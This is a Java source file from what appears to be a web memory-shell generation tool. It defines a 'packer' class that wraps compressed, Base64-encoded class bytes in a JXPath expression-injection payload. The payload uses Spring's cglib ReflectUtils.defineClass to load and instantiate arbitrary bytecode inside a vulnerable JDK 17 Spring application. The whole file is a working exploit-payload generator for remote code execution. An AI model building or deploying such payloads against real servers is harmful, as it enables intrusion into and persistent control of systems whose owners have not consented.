package com.reajason.javaweb.packer.jxpath;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.base64.GzipBase64Packer;
import org.kohsuke.MetaInfServices;

import static com.reajason.javaweb.packer.spel.SpELSpringGzipJDK17Packer.assertClassNameValid;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.JXPathSpringGzipJDK17, parent = Packers.JXPath, order = 1230)
public class JXPathSpringGzipJDK17Packer implements Packer {

    @Override
    public boolean requiresSpringExpressionPackage() {
        return true;
    }
    String template = "newInstance(org.springframework.cglib.core.ReflectUtils.defineClass('{{className}}',org.springframework.util.StreamUtils.copyToByteArray(java.util.zip.GZIPInputStream.new(java.io.ByteArrayInputStream.new(decode(java.util.Base64.getDecoder(), ('{{base64Str}}'))))),getContextClassLoader(java.lang.Thread.currentThread()),getProtectionDomain(java.lang.Class.forName('org.springframework.expression.ExpressionParser')),java.lang.Class.forName('org.springframework.expression.ExpressionParser')))";

    @Override
    public String pack(ClassPackerConfig config) {
        String className = config.getClassName();
        assertClassNameValid(className);
        return template.replace("{{className}}", className)
                .replace("{{base64Str}}", new GzipBase64Packer().pack(config));
    }
}
